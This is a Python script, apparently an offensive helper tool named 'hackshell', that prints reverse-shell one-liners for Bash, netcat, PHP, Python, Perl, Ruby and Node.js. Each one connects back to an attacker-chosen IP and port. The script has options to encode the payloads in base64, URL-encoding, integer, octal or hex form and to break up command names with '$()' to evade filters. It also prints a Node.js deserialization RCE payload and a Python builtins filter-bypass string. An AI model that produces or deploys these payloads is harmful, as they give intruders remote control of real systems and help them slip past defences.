from email import message
import sys
import urllib.parse
import base64
import struct
import socket

def menu():
    return print(""".------..------..------..------..------..------..------..------..------.
|H.--. ||A.--. ||C.--. ||K.--. ||S.--. ||H.--. ||E.--. ||L.--. ||L.--. |
| :/\: || (\/) || :/\: || :/\: || :/\: || :/\: || (\/) || :/\: || :/\: |
| (__) || :\/: || :\/: || :\/: || :\/: || (__) || :\/: || (__) || (__) |
| '--'H|| '--'A|| '--'C|| '--'K|| '--'S|| '--'H|| '--'E|| '--'L|| '--'L|
`------'`------'`------'`------'`------'`------'`------'`------'`------'
Reverse Shell\n1a - Bash\n1b - NetCat \n1c - PHP \n1d - Python \n1e - Perl \n1f - Ruby \n1g - nodejs\n\nType\nd = default \nb64 = base64 \nurle = urltype \nint = integer \nocta = octadeximal \nhex = hexadecimal \njlre = java lang runtime exec \nfunc = function(only nodejs)\n \nex: python hackshell.py 1a ip port long\n\nPrivesc Tricks\n2a - list all\n""")

def ReverseShellBash(ip, port, type):
    rsba = ''.join(("\n/bin/ba$()sh -$()c '/bin/sh -i >& /dev/tcp/"+ip+"/"+port," 0>&1'"))
    message_bytes = rsba.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    if type == 'd':
        print(rsba)
    elif type == 'b64':
        print('\n'+base64_message)
    elif type == 'urle':
        urltype = urllib.parse.quote(message_bytes)
        print('\n'+urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsba2 = ''.join(("\nba$()sh -$()i >& /dev/tcp/"+str(ip2)+"/"+port," 0>&1"))
        print(rsba2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsba2 = ''.join(("\nba$()sh -$()i >& /dev/tcp/"+str(ip2)+"/"+port," 0>&1"))
        print(rsba2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsba2 = ''.join(("\nba$()sh -$()i >& /dev/tcp/"+str(ip2)+"/"+port," 0>&1"))
        print(rsba2)
    elif type == "jlre":
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellNetcat(ip, port, type):
    rsnc = ''.join(("\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|n$()c "+ip+" "+port, " >/tmp/f"))
    message_bytes = rsnc.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    if type == 'd':
        print(rsnc)
    elif type == 'b64':
        print('\n'+base64_message)
    elif type =='urle':
        urltype = urllib.parse.quote(message_bytes)
        print('\n'+urltype)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsnc2 = ''.join(("\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|n$()c "+str(ip2)+" "+port, " >/tmp/f"))
        print(rsnc2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsnc2 = ''.join(("\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|n$()c "+str(ip2)+" "+port, " >/tmp/f"))
        print(rsnc2)
    elif type == 'jlre':
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellPhp(ip, port,type):
    rsph = ''.join(("\nph$()p -$()r '$sock=fsockopen("+"\""+ ip +"\"" +"," + port, ');exec("/bin/sh -i <&3 >&3 2>&3");\''))
    message_bytes = rsph.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    if type == 'd':
        print(rsph)
    elif type == 'b64':
        print('\n'+base64_message)
    elif type =='urle':
        urltype = urllib.parse.quote(message_bytes)
        print('\n'+urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsph2 = ''.join(("\nph$()p -$()r '$sock=fsockopen("+"\""+ str(ip2) +"\"" +"," + port, ');exec("/bin/sh -i <&3 >&3 2>&3");\''))
        print(rsph2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsph2 = ''.join(("\nph$()p -$()r '$sock=fsockopen("+"\""+ str(ip2) +"\"" +"," + port, ');exec("/bin/sh -i <&3 >&3 2>&3");\''))
        print(rsph2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsph2 = ''.join(("\nph$()p -$()r '$sock=fsockopen("+"\""+ str(ip2) +"\"" +"," + port, ');exec("/bin/sh -i <&3 >&3 2>&3");\''))
        print(rsph2)
    elif type == "jlre":
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellPython(ip, port,type):
    rspy = ''.join(("\npy$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+'"'+ip+'"'","+ port +"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
    message_bytes = rspy.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    
    if type == 'd':
        print(rspy)
    elif type == 'b64':
        print('\n'+base64_message)
    elif type == 'urle':
        urltype = urllib.parse.quote(message_bytes)
        print('\n'+urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rspy2 = ''.join(("\npy$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+'"'+str(ip2)+'"'","+ port +"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
        print(rspy2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rspy2 = ''.join(("\npy$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+'"'+str(ip2)+'"'","+ port +"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
        print(rspy2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rspy2 = ''.join(("\npy$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+'"'+str(ip2)+'"'","+ port +"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
        print(rspy2)
    elif type == "jlre":
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellPerl(ip, port,type):
    rspe = ''.join(("\npe$()rl -$()e 'use Socket;$i="+'"'+ ip+'"'+ ";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
    message_bytes = rspe.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    if type == "d":
        print(rspe)
    elif type == 'b64':
        print('\n'+base64_message)
    elif type =='urle':
        urltype = urllib.parse.quote(message_bytes)
        print('\n'+urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rspe2 = ''.join(("\npe$()rl -$()e 'use Socket;$i=" +'"'+ str(ip2)+'"'+ ";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
        print(rspe2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rspe2 = ''.join(("\npe$()rl -$()e 'use Socket;$i=" +'"'+ str(ip2)+'"'+ ";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
        print(rspe2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rspe2 = ''.join(("\npe$()rl -$()e 'use Socket;$i=" +'"'+ str(ip2)+'"'+ ";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
        print(rspe2)
    elif type == 'jlre':
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellRuby(ip, port, type):
    rsr = ''.join(("\nru$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new("'"'+ip+'"'","+port+"))'"))
    message_bytes = rsr.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    if type == "d":
        print(rsr)
    elif type == 'b64':
        print('\n'+base64_message)
    elif type == 'urle':
        urltype = urllib.parse.quote(message_bytes)
        print('\n'+urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsr2 = ''.join(("\nru$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new("'"'+str(ip2)+'"'+ "," + port + "))'"))
        print(rsr2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsr2 = ''.join(("\nru$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new("'"'+str(ip2)+'"'+ "," + port + "))'"))
        print(rsr2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsr2 = ''.join(("\nr$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new("'"'+str(ip2)+'"'+ "," + port + "))'"))
        print(rsr2)
    elif type == 'jlre':
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def nodejs(ip,port,type):
    if type == "d":
        print("\nrequire('child_process').exec('nc -e sh",ip,port+"')")
    elif type == "func":
        print("{\"rce\":\"_$$ND_FUNC$$_function(){require(\\\"child_process\\\").execSync(\\\"/bin/b$()ash -c '/bin/sh -i >& /dev/tcp/"+ip+"/"+port,"0>&1\'\\\")}()\"}")

def privesc():
    builtins_filter_bypass =    "__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat ok.txt')";
    print(builtins_filter_bypass)

try:
    if sys.argv[1] == "1a":
        ReverseShellBash(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1] == "1b":
        ReverseShellNetcat(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1] == "1c":
        ReverseShellPhp(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1] == "1d":
        ReverseShellPython(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1] == "1e":
        ReverseShellPerl(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1] == "1f":
        ReverseShellRuby(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1] == "1g":
        nodejs(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1] == "all":
        ReverseShellBash(sys.argv[2], sys.argv[3], sys.argv[4])
        ReverseShellNetcat(sys.argv[2], sys.argv[3], sys.argv[4])
        ReverseShellPhp(sys.argv[2], sys.argv[3], sys.argv[4])
        ReverseShellPython(sys.argv[2], sys.argv[3], sys.argv[4])
        ReverseShellPerl(sys.argv[2], sys.argv[3], sys.argv[4])
        ReverseShellRuby(sys.argv[2], sys.argv[3], sys.argv[4])
        nodejs(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1] == "2a":
        print("Builtin's RCE - Filter Bypass:")
        privesc()
   # elif sys.arv[1] == "--help":
   #     menu()
except:
    menu()
    print("Some parameter is missing...")
